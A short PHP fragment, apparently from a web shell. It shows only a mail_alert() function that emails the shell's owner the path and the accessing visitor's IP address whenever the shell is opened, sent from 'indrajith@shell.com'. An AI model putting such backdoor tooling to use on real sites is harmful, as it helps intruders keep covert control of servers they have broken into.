...
function mail_alert()
{
    ...
    $content_mail="Your shell in $shell_path is accessed by ".$_SERVER['REMOTE_ADDR'];
    mail($email, "$shell_path", $content_mail ,"From:indrajith@shell.com");
}
